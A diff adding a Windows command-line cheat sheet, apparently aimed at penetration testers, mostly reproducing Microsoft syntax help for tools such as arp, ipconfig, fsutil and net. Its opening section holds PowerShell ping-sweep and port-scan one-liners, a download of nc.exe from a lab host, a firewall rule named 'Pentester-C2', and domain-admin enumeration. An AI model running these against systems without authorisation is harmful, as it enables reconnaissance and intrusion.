@@ -1,0 +1,690 @@
+Key:
+====
+CMD = Use normal command prompt (may still need admin access)
+PowerShell = use PowerShell to run the command
+
+
+PowerShell Essentials:
+======================
+Concept				What's it do?						Handy Alias
+-------				-------------						-----------
+Get-Help [cmdlet] -example	Shows help & examples					help {cmdlet] -examples
+Get-Command			Shows a list of commands				gcm *[string]*
+Get-Member			Shows properties & methods				[cmdlet] | gm
+ForEach-Objest { $_ }		Takes each item on pipeline and handles it as $_	[cmdlet] | % { [cmdlet] $_ }
+Select-String			Searches for strings in files or output,like grep	sls -path [file] -pattern [string]
+
+
+PowerShell Commands:
+====================
+# ping sweeper:
+1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}	# PowerShell
+
+# Port Scanner:
+1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<ip-address>",$_)) "Port $_ is open!"} 2>$null	# PowerShell
+
+# Online Web Client:
+# download nc.exe from 10.10.10.10
+(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")	# Windows 7 PowerShell
+wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"	# Windows 8 and later PowerShell
+
+# Get Firewall Rules
+Get-NetFirewallRule -all | Out-GridView		# PowerShell
+Get-NetFirewallRule -all | Export-csv <file_path.csv>	# PowerShell
+
+# Add Firewall Rule
+New-NetFirewallRule -Action Allow -DisplayName Pentester-C2 -RemoteAddress <ip-address>		# PowerShell
+
+# Find Juicy Stuff:
+# search folder path\to\directory for files that contain the "STRING"
+ls -r c:\path\to\directory -file | % {Select-String -path $_ -pattern STRING}	# PowerShell
+
+# Running Services: 
+get-process # PowerShell
+
+
+CMD Commands:
+=============
+# System Information:
+systeminfo # CMD
+
+# Network Information: 
+ipconfig # CMD
+
+# Running Services: 
+tasklist # CMD 
+get-process # PowerShell
+
+# List services that use the 
+# network functionality module ws2_32.dll
+C:\Windows\system32> tasklist /m ws2_32.dll	# CMD
+
+# Configure Windows machine as Access Point:
+netsh wlan set hostednetwork mode=allow ssid=<my-ssid> key=<my-password> && netsh wlan start hostednetwork	# CMD
+
+# get a list of TCP & UDP activity every second
+netstat -naob 1 | find "<ip-address or port>"	# CMD
+
+# get a list of all available attributes of all running processes
+wmic process list full	# CMD
+
+# get a list of services running inside of each process
+tasklist /svc	# CMD
+
+
+
+Arp Syntax:
+===========
+# arp [/a [<InetAddr>] [/n <IfaceAddr>]] [/g [<InetAddr>] [-n <IfaceAddr>]] [/d <InetAddr> [<IfaceAddr>]] [/s <InetAddr> <EtherAddr> [<IfaceAddr>]]
+
+Parameter:	
+/a [<InetAddr>] [/n <IfaceAddr>]
+Displays current ARP cache tables for all interfaces. The /n parameter is case-sensitive.
+To display the ARP cache entry for a specific IP address, use arp /a with the InetAddr parameter, where InetAddr is an IP address. If InetAddr is not specified, the first applicable interface is used.
+To display the ARP cache table for a specific interface, use the /n IfaceAddr parameter in conjunction with the /a parameter where IfaceAddr is the IP address assigned to the interface.
+
+/g [<InetAddr>] [/n <IfaceAddr>]
+Identical to /a.
+
+[/d <InetAddr> [<IfaceAddr>]
+Deletes an entry with a specific IP address, where InetAddr is the IP address.
+To delete an entry in a table for a specific interface, use the IfaceAddr parameter where IfaceAddr is the IP address assigned to the interface.
+To delete all entries, use the asterisk (*) wildcard character in place of InetAddr.
+
+/s <InetAddr> <EtherAddr> [<IfaceAddr>]
+Adds a static entry to the ARP cache that resolves the IP address InetAddr to the physical address EtherAddr.
+To add a static ARP cache entry to the table for a specific interface, use the IfaceAddr parameter where IfaceAddr is an IP address assigned to the interface.
+
+/?		Displays Help at the command prompt.
+
+# Display the ARP cache tables for all interfaces, type:
+arp /a
+
+# Display the ARP cache table for the interface that is assigned the IP address 10.0.0.99, type:
+arp /a /n 10.0.0.99
+
+# Add a static ARP cache entry that resolves the IP address 10.0.0.80 to the physical address 00-AA-00-4F-2A-9C
+arp /s 10.0.0.80 00-AA-00-4F-2A-9C 
+
+
+Bootcfg Syntax:
+===============
+# Configures, queries, or changes Boot.ini file settings.
+# Bootcfg <parameter> [arguments...]
+
+# Parameter:	Description:
+# Bootcfg -addsw	Adds operating system load options for a specified operating system entry.
+# Bootcfg -copy	Makes a copy of an existing boot entry, to which you can add command-line options.
+# Bootcfg -dbg1394	Configures 1394 port debugging for a specified operating system entry.
+# Bootcfg -debug	Adds or changes the debug settings for a specified operating system entry.
+# Bootcfg -default	Specifies the operating system entry to designate as the default.
+# Bootcfg -delete	Deletes an operating system entry in the [operating systems] section of the Boot.ini file.
+# Bootcfg -ems	Enables the user to add or change the settings for redirection of the Emergency Management Services console to a remote computer.
+# Bootcfg -query	Queries and displays the [boot loader] and [operating systems] section entries from Boot.ini.
+# Bootcfg -raw	Adds operating system load options specified as a string to an operating system entry in the [operating systems] section of the Boot.ini file.
+# Bootcfg -rmsw	Removes operating system load options for a specified operating system entry.
+# Bootcfg -timeout	Changes the operating system time-out value.
+
+
+
+Diskshadow:
+===========
+# DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRAID or DiskPart. DiskShadow also includes a scriptable mode.
+# Membership in the local Administrators group, or equivalent, is the minimum required to run DiskShadow.
+
+# For interactive mode
+diskshadow
+
+# For script mode, where script.txt is a script file containing DiskShadow commands:
+diskshadow -s script.txt
+
+# DiskShadow commands:
+# You can run the following commands in the DiskShadow command interpreter or through a script file:
+# Parameter:	Description:
+# Set1		Sets the context, options, verbose mode, and metadata file for creating shadow copies.
+# Simulate restore	Tests writer involvement in restore sessions on the computer without issuing PreRestore or PostRestore events to writers.
+# Load metadata	Loads a metadata .cab file prior to importing a transportable shadow copy or loads the writer metadata in the case of a restore.
+# Writer		Verifies that a writer or component is included or excludes a writer or component from the backup or restore procedure.
+# Add2		Adds volumes to the set of volumes that are to be shadow copied, or adds aliases to the alias environment.
+# Create2		Starts the shadow copy creation process, using the current context and option settings.
+# Exec		Executes a file on the local computer.
+# Begin backup	Starts a full backup session.
+# End backup	Ends a full backup session and issues a BackupComplete event with the appropriate writer state, if # needed.
+# Begin restore	Starts a restore session and issues a PreRestore event to involved writers.
+# End restore	Ends a restore session and issues a PostRestore event to involved writers.
+# Reset		Resets DiskShadow to the default state.
+# List2		Lists writers, shadow copies, or currently registered shadow copy providers that are on the system.
+# Delete shadows	Deletes shadow copies.
+# Import1		Imports a transportable shadow copy from a loaded metadata file into the system.
+# Mask		Removes hardware shadow copies that were imported by using the import command.
+# Expose		Exposes a persistent shadow copy as a drive letter, share, or mount point.
+# Unexpose	Unexposes a shadow copy that was exposed by using the expose command.
+# Break2		Disassociates a shadow copy volume from VSS.
+# Revert		Reverts a volume back to a specified shadow copy.
+# Exit2		Exits DiskShadow.
+
+# Remarks: At a minimum, only add and create are necessary to create a shadow copy. However, this will forfeit the context and option settings, will be a copy backup, and will only create a shadow copy with no backup execution script.
+
+# This is a sample sequence of commands that will create a shadow copy for backup. It can be saved to file as script.dsh, and executed with DISKSHADOW /s script.dsh
+# Assume the following:
+# You have an existing directory called c:\diskshadowdata.
+# Your system volume is C: and your data volume is D:.
+# You have a backupscript.cmd file in c:\diskshadowdata.
+# Your backupscript.cmd file will perform the copy of shadow data p: and q: to your backup drive.
+
+# You can enter these commands manually or script them:
+
+#DiskShadow script file
+set context persistent nowriters
+set metadata c:\diskshadowdata\example.cab
+set verbose on
+begin backup
+add volume c: alias SystemVolumeShadow
+add volume d: alias DataVolumeShadow
+
+create
+
+expose %SystemVolumeShadow% p:
+expose %DataVolumeShadow% q:
+exec c:\diskshadowdata\backupscript.cmd
+end backup
+#End of script
+
+
+
+Fsutil subcommands:
+===================
+Subcommand:
+Fsutil 8dot3name
+Queries or changes the settings for short name behavior on the system, for example, generates 8.3 character-length file names. Removes short names for all files within a directory. Scans a directory and identifies registry keys that might be impacted if short names were stripped from the files in the directory.
+This parameter applies to: Windows Server 2008 R2 and Windows 7.
+
+Fsutil behavior
+Queries or sets NTFS volume behavior, which includes:
+    The last access time stamp on NTFS volumes
+    How often quota events are written to the system log
+    The internal cache levels of NTFS paged pool and NTFS non-paged pool memory
+    The amount of disk space reserved for the master file table (MFT) Zone
+    The silent deletion of data when the system encounters corruption on an NTFS volume.
+
+Fsutil dirty
+Queries whether the volume's dirty bit is set or sets a volume's dirty bit. When a volume's dirty bit is set, autochk automatically checks the volume for errors the next time the computer is restarted.
+
+Fsutil file
+Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, creates a new file of a specified size, finds a file ID if given the name, or finds a file link name for a specified file ID.
+
+Fsutil fsinfo
+Lists all drives and queries the drive type, volume information, NTFS-specific volume information, or file system statistics.
+
+Fsutil hardlink
+Creates a hard link (a directory entry for a file). Every file can be considered to have at least one hard link. On NTFS volumes, each file can have multiple hard links, so a single file can appear in many directories (or even in the same directory, with different names). Because all of the links reference the same file, programs can open any of the links and modify the file. A file is deleted from the file system only after all links to it are deleted. After you create a hard link, programs can use it like any other file name.
+Lists the hard links for a specified file.
+
+Fsutil objectid
+Manages object identifiers, which are used by the Windows operating system to track objects such as files and directories.
+
+Fsutil quota
+Manages disk quotas on NTFS volumes to provide more precise control of network-based storage. Disk quotas are implemented on a per-volume basis and enable both hard- and soft-storage limits to be implemented on a per-user basis.
+
+Fsutil repair
+Queries or sets the self-healing state of the volume. Self-healing NTFS attempts to correct corruptions of the NTFS file system online without requiring Chkdsk.exe to be run.
+Includes initiating on-disk verification and waiting for repair completion.
+
+Fsutil reparsepoint
+Queries or deletes reparse points (NTFS file system objects that have a definable attribute containing user-controlled data). Reparse points are used to extend functionality in the input/output (I/O) subsystem. They are used for directory junction points and volume mount points. They are also used by file system filter drivers to mark certain files as special to that driver.
+This parameter applies to: Windows Vista, Windows Server 2008, Windows Server 2008 R2, and Windows 7.
+
+Fsutil resource
+Creates a Secondary Transactional Resource Manager, starts or stops a Transactional Resource Manager, or displays information about a Transactional Resource Manager and modifies the following behavior:
+    Whether a default Transactional Resource Manager will clean its transactional metadata at the next mount
+    The specified Transactional Resource Manager to prefer consistency over availability
+    The specified Transaction Resource Manager to prefer availability over consistency
+    The characteristics of a running Transactional Resource Manager
+This parameter applies to: Windows Vista, Windows Server 2008, Windows Server 2008 R2, and Windows 7.
+
+Fsutil sparse
+Manages sparse files. A sparse file is a file with one or more regions of unallocated data in it. A program will see these unallocated regions as containing bytes with the value zero, but no disk space is used to represent these zeros. All meaningful or nonzero data is allocated, whereas all non-meaningful data (large strings of data composed of zeros) is not allocated. When a sparse file is read, allocated data is returned as stored and unallocated data is returned as zeros (by default in accordance with the C2 security requirement specification). Sparse file support allows data to be deallocated from anywhere in the file.
+
+Fsutil transaction
+Commits a specified transaction, rolls back a specified transaction, or displays the following information:
+    A list of currently running transactions
+    Transaction information for a specific file
+    Information for a specific transaction
+    This parameter applies to: Windows Vista, Windows Server 2008, Windows Server 2008 R2, and Windows 7.
+
+Fsutil usn
+Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume.
+
+Fsutil volume
+Manages a volume. Dismounts a volume, queries to see how much free space is available on a disk, or finds a file that is using a specified cluster.
+
+Ftp Syntax:
+===========
+# ftp [-v] [-d] [-i] [-n] [-g] [-s:<FileName>] [-a] [-A] [-x:<SendBuffer>] [-r:<RecvBuffer>] [-b:<AsyncBuffers>][-w:<WindowsSize>]  [-?] [<Host>]
+
+# Parameter:	Description:
+# -v		Suppresses display of remote server responses.
+# -n		Suppresses auto-login upon initial connection.
+# -g		Disables file name globbing. Glob permits the use of the asterisk (*) and question mark (?) as wildcard characters in local file and path names. For more information, see Additional references.
+# -s:<FileName>	Specifies a text file that contains ftp commands. These commands run automatically after ftp starts. This parameter allows no spaces. Use this parameter instead of redirection (<).
+# -a		Specifies that any local interface can be used when binding the FTP data connection.
+# -A		Logs onto the FTP server as anonymous.
+# -x:<SendBuffer>	Overrides the default SO_SNDBUF size of 8192.
+# -r:<RecvBuffer>	Overrides the default SO_RCVBUF size of 8192.
+# -b:<AsyncBuffers>	Overrides the default async buffer count of 3.
+# -w:<WindowsSize>	Specifies the size of the transfer buffer. The default window size is 4096 bytes.
+# -?		Displays help at the command prompt.
+# <host>		Specifies the computer name, IP address, or IPv6 address of the FTP server to which to connect. The host name or address, if specified, must be the last parameter on the line.
+
+# log on to the FTP server named ftp.example.microsoft.com
+ftp ftp.example.microsoft.com
+
+# To log on to the FTP server named ftp.example.microsoft.com and run the ftp commands contained in a file named resync.txt
+ftp -s:resync.txt ftp.example.microsoft.com
+
+
+
+Hostname:
+=========
+# Display the name of the computer
+hostname
+
+
+
+Ipconfig Syntax:
+================
+# ipconfig [/allcompartments] [/all] [/renew [<Adapter>]] [/release [<Adapter>]] [/renew6[<Adapter>]] [/release6 [<Adapter>]] [/flushdns] [/displaydns] [/registerdns] [/showclassid <Adapter>] [/setclassid <Adapter> [<ClassID>]]
+
+# Parameter:
+# /all
+# Displays the full TCP/IP configuration for all adapters. Adapters can represent physical interfaces, such as installed network adapters, or logical interfaces, such as dial-up connections.
+
+# /allcompartments
+# Displays the full TCP/IP configuration for all compartments.
+
+# /displaydns
+# Displays the contents of the DNS client resolver cache, which includes both entries preloaded from the local Hosts file and any recently obtained resource records for name queries resolved by the computer. The DNS Client service uses this information to resolve frequently queried names quickly, before querying its configured DNS servers.
+
+# /flushdns
+# Flushes and resets the contents of the DNS client resolver cache. During DNS troubleshooting, you can use this procedure to discard negative cache entries from the cache, as well as any other entries that have been added dynamically.
+
+# /registerdns
+# Initiates manual dynamic registration for the DNS names and IP addresses that are configured at a computer. You can use this parameter to troubleshoot a failed DNS name registration or resolve a dynamic update problem between a client and the DNS server without rebooting the client computer. The DNS settings in the advanced properties of the TCP/IP protocol determine which names are registered in DNS.
+
+# /release [<Adapter>]
+# Sends a DHCPRELEASE message to the DHCP server to release the current DHCP configuration and discard the IP address configuration for either all adapters (if an adapter is not specified) or for a specific adapter if the Adapter parameter is included. This parameter disables TCP/IP for adapters configured to obtain an IP address automatically. To specify an adapter name, type the adapter name that appears when you use ipconfig without parameters.
+
+# /release6[<Adapter>]
+# Sends a DHCPRELEASE message to the DHCPv6 server to release the current DHCP configuration and discard the IPv6 address configuration for either all adapters (if an adapter is not specified) or for a specific adapter if the Adapter parameter is included. This parameter disables TCP/IP for adapters configured to obtain an IP address automatically. To specify an adapter name, type the adapter name that appears when you use ipconfig without parameters.
+
+# /renew [<Adapter>]
+# Renews DHCP configuration for all adapters (if an adapter is not specified) or for a specific adapter if the Adapter parameter is included. This parameter is available only on computers with adapters that are configured to obtain an IP address automatically. To specify an adapter name, type the adapter name that appears when you use ipconfig without parameters.
+
+# /renew6 [<Adapter>]
+# Renews DHCPv6 configuration for all adapters (if an adapter is not specified) or for a specific adapter if the Adapter parameter is included. This parameter is available only on computers with adapters that are configured to obtain an IPv6 address automatically. To specify an adapter name, type the adapter name that appears when you use ipconfig without parameters.
+
+# /setclassid <Adapter>[ <ClassID>]
+# Configures the DHCP class ID for a specified adapter. To set the DHCP class ID for all adapters, use the asterisk (*) wildcard character in place of Adapter. This parameter is available only on computers with adapters that are configured to obtain an IP address automatically. If a DHCP class ID is not specified, the current class ID is removed.
+
+# /showclassid <Adapter>
+# Displays the DHCP class ID for a specified adapter. To see the DHCP class ID for all adapters, use the asterisk (*) wildcard character in place of Adapter. This parameter is available only on computers with adapters that are configured to obtain an IP address automatically.
+
+# /?
+# Displays Help at the command prompt.
+
+# Display the basic TCP/IP configuration for all adapters, type:
+ipconfig
+
+# Display the full TCP/IP configuration for all adapters, type:
+ipconfig /all
+
+# Renew a DHCP-assigned IP address configuration for only the Local Area Connection adapter, type:
+ipconfig /renew "Local Area Connection"
+
+# Flush the DNS resolver cache when troubleshooting DNS name resolution problems, type:
+ipconfig /flushdns
+
+# Display the DHCP class ID for all adapters with names that start with Local, type:
+ipconfig /showclassid Local*
+
+# Set the DHCP class ID for the Local Area Connection adapter to TEST, type:
+ipconfig /setclassid "Local Area Connection" TEST
+
+
+
+Mount Syntax:
+=============
+# You can use mount to mount Network File System (NFS) network shares.
+# mount [-o <Option>[...]] [-u:<UserName>] [-p:{<Password> | *}] {\\<ComputerName>\<ShareName> | <ComputerName>:/<ShareName>} {<DeviceName> | *}
+
+The mount utility is available only if Client for NFS is installed.
+The following options and arguments can be used with the mount utility.
+
+Term:
+-o rsize=<buffersize>
+Sets the size in kilobytes of the read buffer. Acceptable values are 1, 2, 4, 8, 16, and 32; the default is 32 KB.
+
+-o wsize=<buffersize>
+Sets the size in kilobytes of the write buffer. Acceptable values are 1, 2, 4, 8, 16, and 32; the default is 32 KB.
+
+-o timeout=<seconds>
+Sets the time-out value in seconds for a remote procedure call (RPC). Acceptable values are 0.8, 0.9, and any integer in the range 1-60; the default is 0.8.
+
+-o retry=<number>
+Sets the number of retries for a soft mount. Acceptable values are integers in the range 1-10; the default is 1.
+
+-o mtype={soft | hard}
+Sets the mount type (default is soft). Regardless of the mount type, mount will return if it cannot immediately mount the share. Once the share has been successfully mounted, however, if the mount type is hard, Client for NFS will continue to try to access the share until it is successful. As a result, if the NFS server is unavailable, any Windows program trying to access the share will appear to stop responding, or "hang," if the mount type is hard.
+
+-o anon
+Mounts as an anonymous user.
+
+-o nolock
+Disables locking (default is enabled).
+
+-o casesensitive
+Forces file lookups on the server to be case sensitive.
+
+-o fileaccess=<mode>
+Specifies the default permission mode of new files created on the NFS share. Specify mode as a three-digit number in the form ogw, where o, g, and w are each a digit representing the access granted the file's owner, group, and the world, respectively. The digits must be in the range 0-7 with the following meaning:
+
+    0: No access
+    1: x (execute access)
+    2: w (write access)
+    3: wx
+    4: r (read access)
+    5: rx
+    6: rw
+    7: rwx
+
+-o lang={euc-jp|euc-tw|euc-kr|shift-jis|big5|ksc5601|gb2312-80|ansi}
+Specifies the default encoding used for file and directory names and, if used, must be set to one of the following:
+
+    ansi
+
+-u:<UserName>
+Specifies the user name to use for mounting the share. If username is not preceded by a backslash (\), it is treated as a UNIX user name.
+
+-p:<Password>
+The password to use for mounting the share. If you use an asterisk (*), you will be prompted for the password.
+
+
+
+Mountvol Syntax:
+================
+# Creates, deletes, or lists a volume mount point.
+# mountvol [<Drive>:]<Path VolumeName>
+# mountvol [<Drive>:]<Path> /d
+# mountvol [<Drive>:]<Path> /l
+# mountvol [<Drive>:]<Path> /p
+# mountvol /r
+# mountvol [/n | /e]
+# mountvol <Drive>: /s
+
+# Parameter:		Description:
+# [<Drive>:]<Path>	Specifies the existing NTFS directory where the mount point will reside.
+# <VolumeName>		Specifies the volume name that is the target of the mount point. The volume name uses the # following syntax, where GUID is a globally unique identifier:
+# \\?\Volume\{GUID}\	The brackets { } are required.
+# /d		Removes the volume mount point from the specified folder.
+# /l		Lists the mounted volume name for the specified folder.
+# /p		Removes the volume mount point from the specified directory, dismounts the basic volume, and takes the basic volume offline, making it unmountable. If other processes are using the volume, mountvol closes any open handles before dismounting the volume.
+# /r		Removes volume mount point directories and registry settings for volumes that are no longer in the system, preventing them from being automatically mounted and given their former volume mount point(s) when added back to the system.
+# /n		Disables automatic mounting of new basic volumes. New volumes are not mounted automatically when added to the system.	
+# /e		Re-enables automatic mounting of new basic volumes.
+# /s		Mounts the EFI system partition on the specified drive. Available on Itanium-based computers only.
+# /?		Displays help at the command prompt.
+
+# create a mount point
+mountvol \sysmount \\?\Volume\{2eca078d-5cbc-43d3-aff8-7e8511f60d0e}\
+
+
+
+NET ACCOUNTS:
+=============
+# This command will return the account policy information from the PDC of the current domain, and write it to a file called ACCOUNTS.TXT
+NET ACCOUNTS /DOMAIN >ACCOUNTS.TXT 
+
+
+
+NET CONFIG: 
+===========
+# This command will return the server name, version of Windows, active network adapter information/MAC address, Server hidden status, Maximum Logged On Users, Maximum open files per session, Idle session time, and assign it to a file called SERVER.TXT
+
+NET CONFIG SERVER >SERVER.TXT 
+
+# This command will return the workstation name, user name, version of Windows, network adapter, network adapter information/MAC address, Logon domain, COM Open Timeout, COM Send Count, COM Send Timout, and write it to a file called WKST.TXT.
+
+NET CONFIG WORKSTATION >WKST.TXT 
+
+
+
+Net User Syntax:
+================
+# net user [<UserName> {<Password> | *} [<Options>]] [/domain]
+# net user [<UserName> {<Password> | *} /add [<Options>] [/domain]]
+# net user [<UserName> [/delete] [/domain]]
+
+# Displays a list of all user accounts for the local computer
+net user # CMD
+
+# Displays information about the user <account-name> 
+net user <account-name>
+net user /domain
+
+
+
+Net Group Syntax:
+=================
+# net group [<GroupName> [/comment:"<Text>"]] [/domain]
+# net group [<GroupName>{/add [/comment:"<Text>"] | /delete} [/domain]]
+# net group [<GroupName> <UserName>[ ...] {/add | /delete} [/domain]]
+
+net group /domain admins
+net group /domain controllers
+
+# List Groups
+net group
+
+# Adds a group called <group-name> to the local user accounts database:
+net group <group-name> /add
+
+# Adds the existing user accounts user1, user2, and user3 to the <group-name> group on the local computer
+net group <group-name> user1 user2 user3 /add
+
+# Adds the existing user accounts user1, user2, and user3 to the <group-name> group in the domain database
+net group <group-name> user1 user2 user3 /add /domain
+
+# List user of <group-name>
+net group <group-name>
+
+# Adds a group called <group-name> to the domain database 
+net group <group-name> /add /domain
+
+
+
+Net Computer Syntax:
+====================
+# net computer \\<ComputerName> {/add | /del}
+
+# Adds the computer Grizzlybear to the domain database
+net computer \\grizzlybear /add
+
+
+
+Net Localgroup Syntax:
+======================
+# net localgroup [<GroupName> [/comment:"<Text>"]] [/domain]
+# net localgroup [<GroupName> {/add [/comment:"<Text>"] | /delete} [/domain]
+# net localgroup [<GroupName> <Name> […] {/add |  /delete} [/domain]
+
+# Displays a list of all the local groups on the local server, type:
+net localgroup
+net localgroup administrators
+net localgroup admins
+net localgroup admin
+
+# Adds a local group called <group-name> to the local user accounts database
+net localgroup <group-name> /add
+
+# Adds a local group called <group-name> to the domain user accounts database
+net localgroup <group-name> /add /domain
+
+# Adds the existing user accounts stevev, ralphr (from the Sales domain), and jennyt to the <group-name> local group on the local computer
+net localgroup <group-name> stevev sales\ralphr jennyt /add
+
+# Adds the existing user accounts stevev, ralphr, and jennyt to the <group-name> group of a domain
+net localgroup <group-name> stevev ralphr jennyt /add /domain
+
+# Displays users in the <group-name> local group
+net localgroup <group-name>
+
+# Adds a comment to the <group-name> local group record
+net localgroup <group-name> /comment:"The executive staff."
+
+
+
+Net Session Syntax:
+===================
+# net session [\\<ComputerName>] [/delete] [/list]
+
+# Display a list of session information for the local server
+net session
+
+# Display session information for a client with the computer name bweston
+net session \\bweston
+
+# To end all sessions between the server and the clients connected to it
+net session /delete
+
+
+
+Net Share Syntax:
+=================
+# net share <ShareName>
+# net share <ShareName>=<drive>:<DirectoryPath> [/grant:<user>,{read | change |full}] [/users:<number> | /unlimited] [/remark:<text>] [/cache:{manual | documents | programs | BranchCache |none} ]
+# net share [/users:<number> | /unlimited] [/remark:<text>] [/cache:{manual | documents | programs | BranchCache |none} ]
+# net share {<ShareName> | <DeviceName> | <drive>:<DirectoryPath>} /delete
+# net share <ShareName> \\<ComputerName> /delete
+
+# Display information about shared resources on the local computer, type:
+net share       
+
+# Share a computer's C:\Data directory with the share name DataShare and include a remark, type:
+net share DataShare=c:\Data /remark:"For department 123."       
+
+# Stop sharing the DataShare folder you created in the previous example, type:
+net share DataShare /delete       
+
+# Share a computer's C:\Art List directory with the share name List, type:
+net share list="c:\Art List"    
+
+
+
+Netsh Syntax:
+=============
+# Netsh is a command-line scripting utility that allows you to, either locally or remotely, display or modify the network configuration of a currently running computer. Used without parameters, netsh opens the Netsh.exe command prompt (that is, netsh>).
+
+# netsh[-aAliasFile] [-cContext] [-rRemoteComputer] [{NetshCommand | -fScriptFile}]
+
+
+
+Pushprinterconnections Syntax:
+==============================
+# Reads Deployed Printer Connection settings from Group Policy, and deploys/removes printer connections as needed.
+# pushprinterconnections <-log> <-?>
+
+
+
+Redircmp Syntax:
+================
+# Redirect newly created computer objects to the newcomputerou OU in the domainname.com domain
+redircmp ou=newcomputerou,dc=domainname,dc=com
+
+
+
+Redirusr:
+=========
+# redirect newly created user objects to the newuserou OU in the domainname.com domain
+redirusr ou=newuserou,dc=domainname,dc=com
+
+
+
+Takeown:
+========
+# Enables an administrator to recover access to a file that previously was denied, by making the administrator the owner of the file.
+# takeown [/s <Computer> [/u [<Domain>\]<User name> [/p [<Password>]]]] /f <File name> [/a] [/r [/d {Y|N}]]
+
+# Take ownership of a file named Lostfile
+takeown /f lostfile
+
+
+
+Systeminfo Syntax:
+==================
+# Systeminfo [/s <Computer> [/u <Domain>\<UserName> [/p <Password>]]] [/fo {TABLE | LIST | CSV}] [/nh]
+
+# View configuration information for a computer named Srvmain, type:
+systeminfo /s srvmain
+
+# Remotely view configuration information for a computer named Srvmain2 that is located on the Maindom domain
+systeminfo /s srvmain2 /u maindom\hiropln
+
+# Remotely view configuration information (in list format) for a computer named Srvmain2 that is located on the Maindom domain
+systeminfo /s srvmain2 /u maindom\hiropln /p p@ssW23 /fo list
+
+
+
+Telnet Syntax:
+==============
+# telnet [/a] [/e <EscapeChar>] [/f <FileName>] [/l <UserName>] [/t {vt100 | vt52 | ansi | vtnt}] [<Host> [<Port>]] [/?]
+
+
+# Parameter:	Description:
+# /a		Attempt automatic logon. Same as /l option except uses the currently logged on user’s name.
+# /e <EscapeChar>	Escape character used to enter the Telnet client prompt.
+# /f <FileName>	File name used for client side logging.
+# /l <UserName>	Specifies the user name to log on with on the remote computer.
+# /t {vt100 | vt52 | ansi | vtnt}		Specifies the terminal type. Supported terminal types are vt100, vt52, ansi, and vtnt.
+# <Host> [<Port>]	Specifies the hostname or IP address of the remote computer to connect to, and optionally the TCP port to use (default is TCP port 23).
+# /?		Displays Help at the command prompt. Alternatively, you can type /h.
+
+# Telnet to connect to the computer running the Telnet Server Service at telnet.microsoft.com.
+telnet telnet.microsoft.com
+
+# Telnet to connect to the computer running the Telnet Server Service at telnet.microsoft.com on TCP port 44 and log the session activity in a local file called telnetlog.txt
+telnet /f telnetlog.txt telnet.microsoft.com 44
+
+
+
+Tftp Syntax:
+============
+# tftp [-i] [<Host>] [{get | put}] <Source> [<Destination>]
+
+# Parameter:	Description:
+# -i		Specifies binary image transfer mode (also called octet mode). In binary image mode, the file is transferred in one-byte units. Use this mode when transferring binary files. If -i is omitted, the file is transferred in ASCII mode. This is the default transfer mode. This mode converts the end-of-line (EOL) characters to an appropriate format for the specified computer. Use this mode when transferring text files. If a file transfer is successful, the data transfer rate is displayed.
+# <Host>		Specifies the local or remote computer.
+# put		Transfers the file Source on the local computer to the file Destination on the remote computer. Because the TFTP protocol does not support user authentication, the user must be logged onto the remote computer, and the files must be writable on the remote computer.
+# get		Transfers the file Destination on the remote computer to the file Source on the local computer.
+# <Source>	Specifies the file to transfer.
+# <Destination>	Specifies where to transfer the file.
+
+# Copy the file boot.img from the remote computer Host1.
+tftp –i Host1 get boot.img
+
+
+
+Whoami Syntax:
+==============
+# whoami [/upn | /fqdn | /logonid]
+# whoami {[/user] [/groups] [/priv]} [/fo <Format>] [/nh]
+# whoami /all [/fo <Format>] [/nh]
+
+# Display the domain and user name of the person who is currently logged on to this computer, type:
+whoami
+
+# Output similar to the following appears:
+# DOMAIN1\administrator
+
+# Display all of the information in the current access token, type:
+whoami /all
+
